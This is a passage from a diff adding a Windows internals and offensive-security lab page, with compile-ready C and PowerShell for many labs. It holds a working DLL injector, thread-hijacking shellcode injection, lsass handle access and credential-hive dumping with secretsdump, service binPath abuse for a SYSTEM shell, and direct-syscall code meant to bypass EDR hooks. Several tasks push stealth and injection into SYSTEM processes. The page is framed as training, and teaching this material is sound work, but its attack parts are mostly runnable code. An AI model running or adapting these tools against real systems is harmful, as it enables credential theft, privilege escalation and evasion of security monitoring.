+#include &lt;tlhelp32.h&gt;
+
+BOOL EnableDebugPrivilege() {
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(),
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))
+        return FALSE;
+
+    TOKEN_PRIVILEGES tp;
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid))
+        return FALSE;
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+    return result &amp;&amp; GetLastError() == ERROR_SUCCESS;
+}
+
+DWORD FindProcess(const char *name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
+    if (Process32First(snap, &amp;pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, name) == 0) {
+                CloseHandle(snap);
+                return pe.th32ProcessID;
+            }
+        } while (Process32Next(snap, &amp;pe));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+int main() {
+    printf("[*] Enabling SeDebugPrivilege...\n");
+    if (!EnableDebugPrivilege()) {
+        printf("[-] Failed. Run as Administrator.\n");
+        return 1;
+    }
+    printf("[+] SeDebugPrivilege enabled.\n");
+
+    DWORD pid = FindProcess("lsass.exe");
+    printf("[*] lsass.exe PID: %lu\n", pid);
+
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (hProc) {
+        printf("[+] Successfully opened lsass.exe handle: 0x%p\n", hProc);
+
+        // Read the PEB address (demonstrates privileged access)
+        PROCESS_BASIC_INFORMATION pbi;
+        typedef NTSTATUS(WINAPI *pNtQueryInformationProcess)(
+            HANDLE, ULONG, PVOID, ULONG, PULONG);
+        pNtQueryInformationProcess NtQIP =
+            (pNtQueryInformationProcess)GetProcAddress(
+                GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+
+        if (NtQIP &amp;&amp; NtQIP(hProc, 0, &amp;pbi, sizeof(pbi), NULL) == 0) {
+            printf("[+] lsass PEB address: 0x%p\n", pbi.PebBaseAddress);
+        }
+        CloseHandle(hProc);
+    } else {
+        printf("[-] OpenProcess failed: %lu\n", GetLastError());
+    }
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>whoami /priv</code> from a normal prompt vs an elevated prompt. Compare which privileges appear and their state (Enabled/Disabled).</li>
+              <li>Compile and run <code>token_lab.exe</code> from a normal CMD — observe the failure. Run it elevated — observe success.</li>
+              <li>Modify the code to enumerate ALL privileges on the current token using <code>GetTokenInformation(TokenPrivileges)</code>. Print each privilege name and state.</li>
+              <li>Use Process Explorer: right-click a process → Properties → Security. Compare the token of a regular process vs a SYSTEM service.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: DLL Injection</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Inject a custom DLL into a target process using the classic CreateRemoteThread technique. Understand each step and why it works.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// payload.dll — DLL to inject
+// Compile: cl.exe /LD payload.c /Fe:payload.dll
+#include &lt;windows.h&gt;
+
+BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        MessageBoxA(NULL, "DLL Injected!", "Lab 3", MB_OK);
+    }
+    return TRUE;
+}
+
+// injector.c — Injects payload.dll into target process
+// Compile: cl.exe injector.c /Fe:injector.exe
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+DWORD FindProcess(const char *name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
+    if (Process32First(snap, &amp;pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, name) == 0) {
+                CloseHandle(snap);
+                return pe.th32ProcessID;
+            }
+        } while (Process32Next(snap, &amp;pe));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        printf("Usage: injector.exe &lt;process_name&gt; &lt;dll_path&gt;\n");
+        return 1;
+    }
+
+    const char *target = argv[1];
+    const char *dllPath = argv[2];
+
+    // Step 1: Find target PID
+    DWORD pid = FindProcess(target);
+    if (!pid) { printf("[-] Process not found.\n"); return 1; }
+    printf("[+] Target PID: %lu\n", pid);
+
+    // Step 2: Open target process
+    HANDLE hProc = OpenProcess(
+        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
+        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
+        FALSE, pid);
+    if (!hProc) { printf("[-] OpenProcess failed: %lu\n", GetLastError()); return 1; }
+
+    // Step 3: Allocate memory in target for DLL path string
+    size_t pathLen = strlen(dllPath) + 1;
+    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, pathLen,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteBuf) { printf("[-] VirtualAllocEx failed.\n"); return 1; }
+    printf("[+] Remote buffer: 0x%p\n", remoteBuf);
+
+    // Step 4: Write DLL path into target process memory
+    WriteProcessMemory(hProc, remoteBuf, dllPath, pathLen, NULL);
+
+    // Step 5: Get address of LoadLibraryA in kernel32
+    // (kernel32 is at the same address in all processes due to ASLR per-boot)
+    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
+        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    printf("[+] LoadLibraryA: 0x%p\n", loadLibAddr);
+
+    // Step 6: Create remote thread that calls LoadLibraryA(dllPath)
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)loadLibAddr, remoteBuf, 0, NULL);
+    if (!hThread) { printf("[-] CreateRemoteThread failed.\n"); return 1; }
+
+    printf("[+] Remote thread created. DLL injected!\n");
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Cleanup
+    VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}</code></pre>
+<pre><code class="language-powershell"># Build and test (Visual Studio Developer Command Prompt):
+cl.exe /LD payload.c /Fe:payload.dll
+cl.exe injector.c /Fe:injector.exe
+
+# Open notepad as target
+notepad.exe
+
+# Inject (run elevated if needed)
+.\injector.exe notepad.exe "C:\full\path\to\payload.dll"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile both files. Launch notepad and inject the DLL. Verify the MessageBox appears.</li>
+              <li>Use Process Explorer to confirm <code>payload.dll</code> appears in notepad's DLL list after injection.</li>
+              <li>Modify <code>payload.dll</code> to write a file (<code>C:\temp\injected.txt</code>) instead of showing a MessageBox — stealth is key.</li>
+              <li>Try injecting into a SYSTEM process (e.g., <code>spoolsv.exe</code>). You'll need SeDebugPrivilege — add the enable code from Lab 2.</li>
+              <li>Monitor the injection with Process Monitor: filter for your injector PID. Observe the <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> operations.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Handle Table Inspection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Enumerate open handles for processes to discover file locks, registry keys, and inter-process relationships.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Part 1: List handles for a specific process using Sysinternals Handle
+handle.exe -p explorer.exe -a
+
+# Part 2: PowerShell — query via NtQuerySystemInformation wrapper
+# Uses the NtObjectManager module
+Install-Module NtObjectManager -Scope CurrentUser -Force
+Import-Module NtObjectManager
+
+# Enumerate all handles for a PID
+$handles = Get-NtHandle -ProcessId (Get-Process explorer).Id
+$handles | Group-Object ObjectType | Sort-Object Count -Descending | Format-Table Name, Count
+
+# Filter for file handles
+$handles | Where-Object { $_.ObjectType -eq "File" } |
+    Select-Object Handle, Name | Format-Table -AutoSize
+
+# Filter for registry key handles
+$handles | Where-Object { $_.ObjectType -eq "Key" } |
+    Select-Object Handle, Name | Format-Table -AutoSize</code></pre>
+<pre><code class="language-c">// Part 3: handle_enum.c — Enumerate handles via NtQuerySystemInformation
+// Compile: cl.exe handle_enum.c /Fe:handle_enum.exe
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+#define SystemHandleInformation 16
+
+typedef struct _SYSTEM_HANDLE_ENTRY {
+    ULONG OwnerPid;
+    BYTE  ObjectType;
+    BYTE  Flags;
+    USHORT Handle;
+    PVOID  Object;
+    ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE_ENTRY;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION {
+    ULONG Count;
+    SYSTEM_HANDLE_ENTRY Handles[1];
+} SYSTEM_HANDLE_INFORMATION;
+
+typedef NTSTATUS (WINAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
+
+int main(int argc, char *argv[]) {
+    DWORD targetPid = argc > 1 ? atoi(argv[1]) : GetCurrentProcessId();
+    pNtQuerySystemInformation NtQSI = (pNtQuerySystemInformation)
+        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
+
+    ULONG bufSize = 0x100000;
+    PVOID buf = malloc(bufSize);
+    while (NtQSI(SystemHandleInformation, buf, bufSize, NULL) == 0xC0000004) {
+        bufSize *= 2;
+        buf = realloc(buf, bufSize);
+    }
+
+    SYSTEM_HANDLE_INFORMATION *shi = (SYSTEM_HANDLE_INFORMATION *)buf;
+    printf("[*] Total handles in system: %lu\n", shi->Count);
+    printf("[*] Handles for PID %lu:\n", targetPid);
+    for (ULONG i = 0; i &lt; shi->Count; i++) {
+        if (shi->Handles[i].OwnerPid == targetPid) {
+            printf("  Handle: 0x%04X  Type: %d  Object: %p  Access: 0x%08X\n",
+                shi->Handles[i].Handle, shi->Handles[i].ObjectType,
+                shi->Handles[i].Object, shi->Handles[i].GrantedAccess);
+        }
+    }
+    free(buf);
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Use <code>handle.exe -p lsass.exe</code> to discover what files and keys lsass holds open.</li>
+              <li>Compile and run <code>handle_enum.exe</code> against various PIDs — correlate object type numbers with names.</li>
+              <li>Find all processes that have a handle to <code>\Device\Afd</code> (network sockets).</li>
+              <li>Identify processes holding mutex objects — these often indicate singleton applications.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Object Header Analysis</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Examine Windows kernel object headers to understand the OBJECT_HEADER structure, reference counting, and type indexing.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Use WinDbg (kernel debugging) or livekd from Sysinternals
+# Part 1: Examine object headers for a process object
+
+# In WinDbg:
+# Find the EPROCESS for explorer.exe
+# !process 0 0 explorer.exe
+#
+# The OBJECT_HEADER is at EPROCESS_ADDR - sizeof(OBJECT_HEADER)
+# dt nt!_OBJECT_HEADER [address]
+#
+# Key fields:
+#   PointerCount — kernel-mode reference count
+#   HandleCount  — number of open handles
+#   TypeIndex    — index into ObTypeIndexTable
+#   InfoMask     — which optional headers are present
+
+# Part 2: PowerShell — query object type info
+Import-Module NtObjectManager
+# List all kernel object types
+Get-NtType | Select-Object Name, Index, TotalNumberOfObjects, TotalNumberOfHandles |
+    Sort-Object TotalNumberOfObjects -Descending | Format-Table -AutoSize</code></pre>
+<pre><code class="language-c">// Part 3: Resolve object type from TypeIndex
+// The kernel encodes TypeIndex with a cookie (Win10+):
+//   RealIndex = TypeIndex ^ ObHeaderCookie ^ (OBJECT_HEADER_addr >> 8 &amp; 0xFF)
+// This prevents trivial DKOM type spoofing</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Use <code>Get-NtType</code> to list all object types. Identify Process, Thread, File, Key, Mutant types.</li>
+              <li>In WinDbg: <code>dt nt!_OBJECT_HEADER</code> — note the layout and optional header fields.</li>
+              <li>Examine the <code>InfoMask</code> field: bits indicate which optional headers (Name, Creator, Handle) precede the OBJECT_HEADER.</li>
+              <li>Compare PointerCount vs HandleCount for lsass.exe — explain why PointerCount > HandleCount.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Registry Hive Parsing</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Parse registry hives offline to extract credentials, system configuration, and evidence of persistence mechanisms.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Part 1: Export registry hives (requires admin/SYSTEM)
+reg save HKLM\SAM C:\temp\SAM
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+reg save HKLM\SECURITY C:\temp\SECURITY
+reg save HKLM\SOFTWARE C:\temp\SOFTWARE
+
+# Part 2: Query interesting keys live
+# Autoruns
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+# Installed services
+reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s | findstr "ImagePath"
+
+# Last logged-on user
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /v LastLoggedOnUser</code></pre>
+<pre><code class="language-bash"># Part 3: Offline parsing with impacket
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# Parse SOFTWARE hive for installed programs
+python3 -c "
+import struct
+# Registry hive format: 'regf' signature, bins, cells
+# Each cell has a key node, value node, or other record
+# Key nodes contain: name, class, subkey count, value count, timestamps
+print('Registry hives use a B-tree structure with key cells and value cells')
+print('The SYSTEM hive ControlSet00X maps to CurrentControlSet at boot')
+"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Export all four hives and extract local account hashes with <code>impacket-secretsdump</code>.</li>
+              <li>Identify all autorun entries across HKLM and HKCU Run/RunOnce keys.</li>
+              <li>Find the boot key from the SYSTEM hive — it's derived from the JD, Skew1, GBG, Data class values under <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code>.</li>
+              <li>Parse the SOFTWARE hive to find recently used applications (UserAssist, MUICache).</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Service Enumeration and Abuse</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Enumerate Windows services, identify misconfigurations, and exploit weak permissions for privilege escalation.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Part 1: Enumerate services
+Get-Service | Where-Object { $_.Status -eq "Running" } | Format-Table -AutoSize
+Get-CimInstance Win32_Service | Select-Object Name, StartName, PathName, StartMode |
+    Format-Table -AutoSize
+
+# Find services running as SYSTEM
+Get-CimInstance Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" } |
+    Select-Object Name, PathName | Format-Table -AutoSize
+
+# Find unquoted service paths
+Get-CimInstance Win32_Service | Where-Object {
+    $_.PathName -notmatch '^"' -and $_.PathName -match '\s'
+} | Select-Object Name, PathName
+
+# Part 2: Check service permissions with accesschk
+accesschk.exe /accepteula -ucqv "Everyone" * -s
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * -s
+
+# Part 3: Check binary permissions
+icacls "C:\Program Files\VulnApp\service.exe"</code></pre>
+<pre><code class="language-powershell"># Part 4: Exploit weak service permissions
+# If you have SERVICE_CHANGE_CONFIG on a service:
+sc config VulnSvc binPath= "C:\temp\reverse.exe"
+sc stop VulnSvc
+sc start VulnSvc
+
+# If you have WRITE_DAC:
+sc sdset VulnSvc "D:(A;;RPWPCCDCLCSWRCWDWOGA;;;WD)"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enumerate all services and identify those running as LocalSystem with writable binary paths.</li>
+              <li>Use <code>accesschk</code> to find services where your user has modification rights.</li>
+              <li>Create a vulnerable service with an unquoted path and demonstrate the exploitation.</li>
+              <li>Modify a service binary path to point to a payload — observe the SYSTEM shell after restart.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Direct Syscall Implementation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Implement direct syscalls to bypass EDR hooks in ntdll.dll by dynamically resolving System Service Numbers.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// syscall_direct.c — Resolve SSN and invoke syscalls directly
+// Compile: cl.exe syscall_direct.c /Fe:syscall_direct.exe
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// SSN resolver: reads the mov eax, SSN instruction from ntdll stub
+DWORD GetSSN(const char *funcName) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    BYTE *pFunc = (BYTE *)GetProcAddress(ntdll, funcName);
+    if (!pFunc) return -1;
+
+    // Check for standard stub pattern: 4C 8B D1 B8 XX XX 00 00
+    if (pFunc[0] == 0x4C &amp;&amp; pFunc[1] == 0x8B &amp;&amp;
+        pFunc[2] == 0xD1 &amp;&amp; pFunc[3] == 0xB8) {
+        return *(DWORD *)(pFunc + 4);
+    }
+
+    // If hooked (jmp/call at start), walk neighboring stubs
+    // Halo's Gate / Hell's Gate technique
+    printf("[!] %s appears hooked, trying neighbor resolution\n", funcName);
+    for (int i = 1; i &lt; 500; i++) {
+        // Check upward neighbor
+        if (*(pFunc - i * 32 + 0) == 0x4C &amp;&amp; *(pFunc - i * 32 + 3) == 0xB8) {
+            return *(DWORD *)(pFunc - i * 32 + 4) + i;
+        }
+        // Check downward neighbor
+        if (*(pFunc + i * 32 + 0) == 0x4C &amp;&amp; *(pFunc + i * 32 + 3) == 0xB8) {
+            return *(DWORD *)(pFunc + i * 32 + 4) - i;
+        }
+    }
+    return -1;
+}
+
+int main() {
+    // Resolve SSNs for key functions
+    const char *funcs[] = {
+        "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
+        "NtCreateThreadEx", "NtProtectVirtualMemory",
+        "NtOpenProcess", "NtClose"
+    };
+
+    printf("%-30s SSN\n", "Function");
+    printf("%-30s ---\n", "--------");
+    for (int i = 0; i &lt; 6; i++) {
+        DWORD ssn = GetSSN(funcs[i]);
+        printf("%-30s 0x%04X (%d)\n", funcs[i], ssn, ssn);
+    }
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile and run — note the SSN values for your OS build.</li>
+              <li>Cross-reference SSNs with the <a href="https://j00ru.vexillium.org/syscalls/nt/64/">syscall table</a> for your Windows version.</li>
+              <li>Modify the code to detect if any ntdll function is hooked by checking the first bytes for <code>jmp</code> or <code>call</code> instructions.</li>
+              <li>Implement the Hell's Gate technique to resolve SSNs even when the target function is hooked.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Process Environment Block (PEB) Analysis</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Walk the PEB structure to enumerate loaded modules, command line arguments, and environment variables without using standard APIs.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// peb_walk.c — Walk PEB to enumerate loaded DLLs
+// Compile: cl.exe peb_walk.c /Fe:peb_walk.exe
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    // Method 1: Read PEB via NtQueryInformationProcess
+    PROCESS_BASIC_INFORMATION pbi;
+    typedef NTSTATUS (WINAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+    pNtQIP NtQIP = (pNtQIP)GetProcAddress(
+        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+
+    NtQIP(GetCurrentProcess(), 0, &amp;pbi, sizeof(pbi), NULL);
+    PEB *peb = pbi.PebBaseAddress;
+
+    printf("[*] PEB Address: %p\n", peb);
+    printf("[*] ImageBaseAddress: %p\n", peb->Reserved3[1]); // ImageBase
+    printf("[*] Ldr: %p\n", peb->Ldr);
+
+    // Walk InMemoryOrderModuleList
+    printf("\n[*] Loaded Modules (InMemoryOrderModuleList):\n");
+    PLIST_ENTRY head = &amp;peb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY curr = head->Flink;
+    while (curr != head) {
+        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
+            curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        printf("  Base: %p  Size: 0x%08X  %ws\n",
+            entry->DllBase,
+            entry->Reserved3[1],  // SizeOfImage
+            entry->FullDllName.Buffer);
+        curr = curr->Flink;
+    }
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile and run — verify the loaded modules match what Process Explorer shows.</li>
+              <li>Extend the code to also read <code>ProcessParameters</code> from the PEB to extract the command line and environment variables.</li>
+              <li>Modify the code to walk a remote process's PEB using <code>ReadProcessMemory</code>.</li>
+              <li>Understand why malware uses PEB walking to resolve DLL bases without calling <code>GetModuleHandle</code>.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Thread Context Manipulation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Suspend a thread, modify its execution context (registers), and redirect execution — the basis of thread hijacking injection.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// thread_hijack.c — Suspend, modify context, resume
+// Compile: cl.exe thread_hijack.c /Fe:thread_hijack.exe
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Shellcode: MessageBoxA("Hijacked!", "Lab 10", MB_OK)
+// Replace with your own for testing
+unsigned char shellcode[] =
+    "\xcc"  // INT3 — debug breakpoint (replace with real shellcode)
+    "\xc3"; // RET
+
+DWORD FindFirstThread(DWORD pid) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { .dwSize = sizeof(te) };
+    if (Thread32First(snap, &amp;te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                CloseHandle(snap);
+                return te.th32ThreadID;
+            }
+        } while (Thread32Next(snap, &amp;te));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) { printf("Usage: thread_hijack.exe &lt;PID&gt;\n"); return 1; }
+    DWORD pid = atoi(argv[1]);
+
+    // Open process and allocate shellcode buffer
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProc, remoteBuf, shellcode, sizeof(shellcode), NULL);
+    printf("[+] Shellcode at: %p\n", remoteBuf);
+
+    // Find and suspend target thread
+    DWORD tid = FindFirstThread(pid);
+    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
+    SuspendThread(hThread);
+    printf("[+] Thread %lu suspended\n", tid);
+
+    // Get current context and save RIP
+    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+    GetThreadContext(hThread, &amp;ctx);
+    DWORD64 origRip = ctx.Rip;
+    printf("[*] Original RIP: 0x%llX\n", origRip);
+
+    // Redirect RIP to shellcode
+    ctx.Rip = (DWORD64)remoteBuf;
+    SetThreadContext(hThread, &amp;ctx);
+    printf("[+] RIP redirected to shellcode\n");
+
+    // Resume thread
+    ResumeThread(hThread);
+    printf("[+] Thread resumed — shellcode executing\n");
+
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Spawn a target process (notepad.exe). Compile and run the hijacker against it.</li>
+              <li>Replace the INT3 with actual shellcode (e.g., WinExec calc.exe). Verify execution.</li>
+              <li>Add code to restore the original RIP after shellcode runs (trampoline technique).</li>
+              <li>Compare this technique to CreateRemoteThread injection — which is stealthier and why?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Kernel Callback Registration</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Enumerate kernel callbacks (process creation, image load, registry) that EDRs and security products register.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Part 1: Enumerate registered callbacks using a driver or WinDbg
+# In WinDbg (kernel debug):
+#   List PsSetCreateProcessNotifyRoutine callbacks:
+#   dt nt!_CALLBACK_ENTRY_ITEM
+#   !callback
+
+# Part 2: PowerShell — enumerate via NtObjectManager or custom tool
+# List loaded kernel drivers (callback registrants)
+Get-CimInstance Win32_SystemDriver | Where-Object { $_.State -eq "Running" } |
+    Select-Object Name, PathName, Description | Format-Table -AutoSize
+
+# Find security-related drivers (EDR, AV)
+Get-CimInstance Win32_SystemDriver | Where-Object {
+    $_.PathName -match "(?i)(crowd|sentinel|defender|carbon|cylance|sophos|eset|trend)"
+} | Select-Object Name, PathName</code></pre>
+<pre><code class="language-c">// Part 3: Kernel callback types
+// Key callbacks that EDRs register:
+//   PsSetCreateProcessNotifyRoutineEx — process creation/exit
+//   PsSetCreateThreadNotifyRoutine    — thread creation
+//   PsSetLoadImageNotifyRoutine       — DLL/image loads
+//   CmRegisterCallbackEx              — registry operations
+//   ObRegisterCallbacks               — handle operations (open/duplicate)
+//   MiniFilter callbacks              — file system I/O
+//
+// Enumerating these from user mode requires parsing kernel memory
+// or using tools like WinDbg, PCHunter, or custom signed drivers</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>List all running kernel drivers and identify which belong to security products.</li>
+              <li>In WinDbg: use <code>!callback</code> to enumerate process/thread/image callbacks.</li>
+              <li>Identify which driver registered each callback — correlate addresses to driver ranges.</li>
+              <li>Research how attackers remove or blind kernel callbacks (DKOM on callback arrays).</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Security Descriptor Analysis</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Parse and understand Windows security descriptors (DACL, SACL, owner, group) on processes, files, registry keys, and services.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Part 1: Query security descriptors
+# File DACL
+icacls "C:\Windows\System32\cmd.exe"
+Get-Acl "C:\Windows\System32\cmd.exe" | Format-List
+
+# Registry key DACL
+Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
+
+# Service security descriptor (SDDL format)
+sc sdshow Spooler
+# D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)...
+# Decode: D = DACL, A = Allow, AU = Authenticated Users, BA = Builtin Admins
+
+# Process DACL
+Import-Module NtObjectManager
+$proc = Get-NtProcess -ProcessId (Get-Process lsass).Id -Access ReadControl
+$proc.SecurityDescriptor | Format-List
+$proc.SecurityDescriptor.Dacl | Format-Table</code></pre>
+<pre><code class="language-powershell"># Part 2: SDDL string format breakdown
+# D:(ace_type;ace_flags;rights;object_guid;inherit_guid;account_sid)
+# Common SIDs:
+#   BA = BUILTIN\Administrators    SY = NT AUTHORITY\SYSTEM
+#   WD = Everyone                  AU = Authenticated Users
+#   BU = BUILTIN\Users             CO = Creator Owner
+#
+# Common rights:
+#   GA = Generic All    GR = Generic Read    GW = Generic Write    GX = Generic Execute
+#   FA = File All       FR = File Read       FW = File Write
+#   KA = Key All        KR = Key Read        KW = Key Write
+
+# Decode SDDL
+$sddl = "D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FR;;;BU)"
+$sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($sddl)
+$sd.DiscretionaryAcl | ForEach-Object {
+    [PSCustomObject]@{
+        Type   = $_.AceType
+        SID    = $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount])
+        Access = $_.AccessMask
+    }
+} | Format-Table</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Decode the SDDL string for the Spooler service — identify who can start/stop/configure it.</li>
+              <li>Compare the DACLs of <code>cmd.exe</code> vs <code>lsass.exe</code> process objects. Why is lsass more restricted?</li>
+              <li>Find files or services with overly permissive DACLs (Everyone: Full Control).</li>
+              <li>Modify a service DACL to grant your user start/stop rights using <code>sc sdset</code>.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 13: PEB Walking for DLL Resolution</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Resolve API function addresses by walking PEB → LDR → InLoadOrderModuleList without calling GetProcAddress — a core malware evasion technique.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// peb_resolve.c — Resolve API by hash without GetProcAddress
+// Compile: cl.exe peb_resolve.c /Fe:peb_resolve.exe
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// djb2 hash of a string
+DWORD HashString(const char *str) {
+    DWORD hash = 5381;
+    while (*str) hash = ((hash &lt;&lt; 5) + hash) + (unsigned char)*str++;
+    return hash;
+}
+
+// Walk PEB → Ldr → InLoadOrderModuleList to find a DLL base by hash
+HMODULE GetModuleByHash(DWORD hash) {
+    // Access PEB via TEB (gs:[0x60] on x64)
+    #ifdef _WIN64
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    #else
+    PPEB peb = (PPEB)__readfsdword(0x30);
+    #endif
+
